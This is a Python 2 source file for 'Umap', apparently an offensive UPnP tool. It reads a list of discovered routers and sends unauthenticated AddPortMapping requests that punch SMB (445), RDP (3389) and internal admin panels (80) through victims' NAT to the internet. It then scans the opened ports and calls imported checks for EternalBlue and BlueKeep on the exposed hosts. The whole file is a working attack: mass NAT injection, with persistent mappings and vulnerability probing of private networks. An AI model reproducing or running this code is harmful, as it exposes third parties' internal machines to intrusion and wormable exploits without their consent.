#
# Umap v0.1beta (UPNP Map) might have borrowed code from all of things listed here if your mentioned and see your code thanks
# formatez@toor.do (Daniel Garcia)
# http://www.toor.do/
#allot of code was needed and modified and or used from here and others thanks guys for great code and algos
#https://github.com/sirMackk/ZeroNet/blob/upnp_punch_squashed/src/util/UpnpPunch.py
#https://www.akamai.com/cn/zh/multimedia/documents/white-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf

import urlparse
from threading import Thread
import httplib, sys
from Queue import Queue
import json
import urllib2
from xml.dom.minidom import parseString
import re, urllib2, httplib
import requests
from fdf import *
import random
import socket
import os 
from songstress import *
from multiprocessing.pool import ThreadPool
from win32com.client import Dispatch

speak = Dispatch("SAPI.SpVoice")

description = "Angel_Gabriel"
remove_whitespace = re.compile(r'>\s*<')
Enpoint_locations = []
forwarded_ips = []
exposed_admin_panels = []
vulnerable_to_Eternal = []
close_mappings = []
ports_to_punch = ['445','3389'] 


#here is the basics of this tool 
def open_ports_internal(internal_clients,port,description):
    complete_mappings = []
    for clients in internal_clients:
        print "generating portmapping for %s" % clients
        external_port = GenerateDynamicPortNumber()
        print external_port
        doc = Document()
        #http://mattscodecave.com/posts/using-python-and-upnp-to-forward-a-port.html
        # create the envelope element and set its attributes
        envelope = doc.createElementNS('', 's:Envelope')
        envelope.setAttribute('xmlns:s', 'http://schemas.xmlsoap.org/soap/envelope/')
        envelope.setAttribute('s:encodingStyle', 'http://schemas.xmlsoap.org/soap/encoding/')

        # create the body element
        body = doc.createElementNS('', 's:Body')

        # create the function element and set its attribute
        fn = doc.createElementNS('', 'u:AddPortMapping')
        fn.setAttribute('xmlns:u', 'urn:schemas-upnp-org:service:WANIPConnection:1')

        # setup the argument element names and values
        # using a list of tuples to preserve order
        arguments = [
                ('NewExternalPort', '%s'  % external_port),           # specify port on router
                ('NewProtocol', 'TCP'),                 # specify protocol
                ('NewInternalPort',port),           # specify port on internal host
                ('NewInternalClient', '%s' % clients), # specify IP of internal host
                ('NewEnabled', '1'),                    # turn mapping ON
                ('NewPortMappingDescription', description), # add a description
                ('NewLeaseDuration', '0')]        # NewEnabled should be 1 by default, but better supply it.
        # NewPortMappingDescription Can be anything you want, even an empty string.
        # NewLeaseDuration can be any integer BUT some UPnP devices don't support it,
        # so set it to 0 for better compatibility.

        # container for created nodes
        argument_list = []

        # iterate over arguments, create nodes, create text nodes,
        # append text nodes to nodes, and finally add the ready product
        # to argument_list
        for k, v in arguments:
            tmp_node = doc.createElement(k)
            tmp_text_node = doc.createTextNode(v)
            tmp_node.appendChild(tmp_text_node)
            argument_list.append(tmp_node)

        # append the prepared argument nodes to the function element
        for arg in argument_list:
            fn.appendChild(arg)

        # append function element to the body element
        body.appendChild(fn)

        # append body element to envelope element
        envelope.appendChild(body)

        # append envelope element to document, making it the root element
        doc.appendChild(envelope)

        # our tree is ready, conver it to a string
        pure_xml = doc.toxml()
        #print pure_xml
        local_upnp = {"pure_xml_doc":pure_xml,"external_port":external_port}
        complete_mappings.append(local_upnp)
    return complete_mappings
       
def open_ports_internal_admin(internal_clients):
    complete_mappings = []
    for clients in internal_clients:
        print "generating portmapping for %s" % clients
        external_port = GenerateDynamicPortNumber()
        print external_port
        doc = Document()
        #http://mattscodecave.com/posts/using-python-and-upnp-to-forward-a-port.html
        # create the envelope element and set its attributes
        envelope = doc.createElementNS('', 's:Envelope')
        envelope.setAttribute('xmlns:s', 'http://schemas.xmlsoap.org/soap/envelope/')
        envelope.setAttribute('s:encodingStyle', 'http://schemas.xmlsoap.org/soap/encoding/')

        # create the body element
        body = doc.createElementNS('', 's:Body')

        # create the function element and set its attribute
        fn = doc.createElementNS('', 'u:AddPortMapping')
        fn.setAttribute('xmlns:u', 'urn:schemas-upnp-org:service:WANIPConnection:1')

        # setup the argument element names and values
        # using a list of tuples to preserve order
        arguments = [
                ('NewExternalPort', '%s'  % external_port),           # specify port on router
                ('NewProtocol', 'TCP'),                 # specify protocol
                ('NewInternalPort','80'),           # specify port on internal host
                ('NewInternalClient', '%s' % clients), # specify IP of internal host
                ('NewEnabled', '1'),                    # turn mapping ON
                ('NewPortMappingDescription', 'printer'), # add a description
                ('NewLeaseDuration', '0')]        # NewEnabled should be 1 by default, but better supply it.
        # NewPortMappingDescription Can be anything you want, even an empty string.
        # NewLeaseDuration can be any integer BUT some UPnP devices don't support it,
        # so set it to 0 for better compatibility.

        # container for created nodes
        argument_list = []

        # iterate over arguments, create nodes, create text nodes,
        # append text nodes to nodes, and finally add the ready product
        # to argument_list
        for k, v in arguments:
            tmp_node = doc.createElement(k)
            tmp_text_node = doc.createTextNode(v)
            tmp_node.appendChild(tmp_text_node)
            argument_list.append(tmp_node)

        # append the prepared argument nodes to the function element
        for arg in argument_list:
            fn.appendChild(arg)

        # append function element to the body element
        body.appendChild(fn)

        # append body element to envelope element
        envelope.appendChild(body)

        # append envelope element to document, making it the root element
        doc.appendChild(envelope)

        # our tree is ready, conver it to a string
        pure_xml = doc.toxml()
        #print pure_xml
        local_upnp = {"pure_xml_doc":pure_xml,"external_port":external_port}
        complete_mappings.append(local_upnp)
    return complete_mappings


def GenerateDynamicPortNumber():
    return 35000 + random.randrange(15000)



def port_forwarder(router_path,port,pure_xml,external_port,control_url):
    # use the object returned by urlparse.urlparse to get the hostname and port
    conn = httplib.HTTPConnection(router_path,port,timeout = 3)

    # use the path of WANIPConnection (or WANPPPConnection) to target that service,
    # insert the xml payload,
    # add two headers to make tell the server what we're sending exactly.
    conn.request('POST',
    control_url,
    pure_xml,
    {'SOAPAction': '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
     'Content-Type': 'text/xml'}
    )

    # wait for a response
    resp = conn.getresponse()
    print resp.read()
    status = resp.status
    # print the response status
    print type(resp.status)

    # print the response body
    
    
    if "200"  in  str(status):
       print resp.read()
       print resp
       print "Success"
       local_forwards = {"external_port":external_port,"control_url":control_url,"external_ip":router_path}
       forwarded_ips.append(local_forwards)
       print local_forwards
       
    else:
       pass
    


def _node_val(node):
	""" 
	Get the text value of the first child text node of a node.
	"""
	return node.childNodes[0].data




def _parse_igd_profile(profile_xml):
	"""
	Traverse the profile xml DOM looking for either
	WANIPConnection or WANPPPConnection and return
	the value found as well as the 'controlURL'.
	"""
	dom = parseString(profile_xml)

	service_types = dom.getElementsByTagName('serviceType')
	for service in service_types:
		if _node_val(service).find('WANIPConnection') > 0 or \
		   _node_val(service).find('WANPPPConnection') > 0:
			control_url = service.parentNode.getElementsByTagName(
				'controlURL'
			)[0].childNodes[0].data
			upnp_schema = _node_val(service).split(':')[-2]
			return control_url, upnp_schema

	return False




def _retrieve_igd_profile(url):
    try:
       #print url
       content = urllib2.urlopen(url,timeout = 3).read()
       #print content
       return content
    except:
        pass




def PortScan(ip,port):
    print "inside of portscan"
    try:
       port = int(port)
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       sock.settimeout(2)
       result = sock.connect_ex((ip, port))
       if result == 0:
          print '%d' %(port) +" Is Open!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
          sock.close()
          admin_panel = "http://"+str(ip)+":"+str(port)
          exposed_admin_panels.append(admin_panel)
          try:
             speak.Speak("Open Port Identified")
          except:
              pass
       if result != 0:
         sock.close()
                
    except socket.gaierror:
    	   pass

      

def guess_ip_admin_takeover(internal_ip):
    local_ips = []
    (a,b,c,d) = internal_ip.split('.')
    d = int(d)
    originald = d
    d = 0
    while d < 1:
        if d == originald:
            d += 1
            continue
        d += 1
        ipGuess = a+'.'+b+'.'+c+'.'+str(d)
        local_ips.append(ipGuess)
    return local_ips



def guess_ip_all_hosts(internal_ip):
    local_ips = []
    (a,b,c,d) = internal_ip.split('.')
    d = int(d)
    originald = d
    d = 0
    while d < 255:
        if d == originald:
            d += 1
            continue
        d += 1
        ipGuess = a+'.'+b+'.'+c+'.'+str(d)
        local_ips.append(ipGuess)
    return local_ips





def build_vectors(method_type):
    #here we open outout we saved earlier
    f = open('outvics.txt','r')
    upnp_objects = []
    for url in f:
        d = json.loads(url)
        
        Enpoint_locations.append(d['Location'])
        try:
            profile_xml = _retrieve_igd_profile(d['Location'])
            if profile_xml:
               control_url, upnp_schema = _parse_igd_profile(profile_xml)
               
               clean_location = urlparse.urlsplit(d['Location'])
               
               wanip_url = clean_location.scheme +"://" + clean_location.hostname+":"+str(clean_location.port)
               
               if "admin" in method_type:
                  internal_ranges = guess_ip_admin_takeover(d['Internal_IP'])
                  local_upnp_object = {"External_ip":clean_location.hostname,"Port":clean_location.port,"wanip_location":wanip_url,"control_url":control_url,"Internal_ranges":internal_ranges,"Internal_ip":d['Internal_IP']}
                  upnp_objects.append(local_upnp_object)
                  print local_upnp_object


               if "internal" in method_type:
                  internal_ranges = guess_ip_all_hosts(d['Internal_IP'])
                  local_upnp_object = {"External_ip":clean_location.hostname,"Port":clean_location.port,"wanip_location":wanip_url,"control_url":control_url,"Internal_ranges":internal_ranges,"Internal_ip":d['Internal_IP']}
                  upnp_objects.append(local_upnp_object)
                  print local_upnp_object

               
        except:
              pass
       
    return upnp_objects
       

def weaping_banshee_admin(method_type):
    built_vectors = build_vectors(method_type)
    print("In Weeping Banshee")
    for items_in in built_vectors:
        print items_in           
        wan_location = items_in['wanip_location']
        control_url = items_in['control_url']
        print "Attacking Host:" + items_in['wanip_location']
        control_point = wan_location+control_url
        trimmed_list = items_in['Internal_ranges']
        trimmed_list2 = trimmed_list[:255-1]#?
        pure_xml_docs = open_ports_internal_admin(trimmed_list2)
        for docs in pure_xml_docs:
            try:
             
                port_forwarder(items_in['External_ip'],items_in['Port'],docs['pure_xml_doc'],docs['external_port'],control_point)
          
            except:
               pass
            

def weaping_banshee_internal(method_type):
    built_vectors = build_vectors(method_type)
    print("In Weeping Banshee Internal")
    try:
       for items_in in built_vectors:
           try:
              wan_location = items_in['wanip_location']
              control_url = items_in['control_url']
              print "Attacking Host:" + items_in['wanip_location']
              control_point = wan_location+control_url
              trimmed_list = items_in['Internal_ranges']
              trimmed_list2 = trimmed_list[:20]
              for ports in ports_to_punch:
                  pure_xml_docs = open_ports_internal(trimmed_list2,ports,description)
                  for docs in pure_xml_docs:
                      try:
             
                          port_forwarder(items_in['External_ip'],items_in['Port'],docs['pure_xml_doc'],docs['external_port'],control_point)
          
                      except:
                          pass
           except:
                pass

    except:
         pass
            
def executer_internal(method_type):
    try:
       
       weaping_banshee_internal(method_type)
    except:
        pass
      
    for ips_forwarded in set(forwarded_ips):
        print(ips_forwarded)
        ip_to_scan = ips_forwarded['external_ip'].strip()
        port_to_scan = str(ips_forwarded['external_port']).strip()
        print(ip_to_scan,port_to_scan)
        
        print("Attempting PortScan of %s"% ip_to_scan +""+":"+ port_to_scan)
        PortScan(ip_to_scan,port_to_scan)
        
        if  port_to_scan:
            try:
                    
                is_vuln,Pul24r_xor_key = Ardent_Chelist(ip_to_scan, port_to_scan)
                if is_vuln:
                   print("Internal Host {} External Port {} Suffer From Eternal Blue Vuln".format(ip_to_scan, port_to_scan))
            except:
                  pass

       


        
            try:
                    
                is_vuln,Bluekeep_exploit_dict = violent_pianist(ip_to_scan, port_to_scan)
                if is_vuln:
                   print("Internal Host {} External Port {} Suffer From Eternal Blue Vuln".format(ip_to_scan, port_to_scan))
                else:
                    print("No Bluekeep For You sir")
            except:
                  pass

                 
             
        
     
        
    speak.Speak("Execution Has Completed Sir")
    for panels in exposed_admin_panels:
        print(panels)
  
    


def executer_admin(method_type):
    try:
       #modified to allow admin  panel forwarding only or all internal clients attempt
       weaping_banshee_admin(method_type)
    except:
        pass
      
    for ips_forwarded in forwarded_ips:
        print(ips_forwarded)
        ip_to_scan = ips_forwarded['external_ip'].strip()
        port_to_scan = str(ips_forwarded['external_port']).strip()
        print(ip_to_scan,port_to_scan)
        try:
            print("Attempting PortScan of %s"% ip_to_scan +""+":"+ port_to_scan)
            PortScan(ip_to_scan,port_to_scan)
       
        except:
            close_mappings.append(ips_forwarded)
            pass
    speak.Speak("Execution Has Completed Sir")
    for panels in exposed_admin_panels:
        print(panels)
        
    
    
    
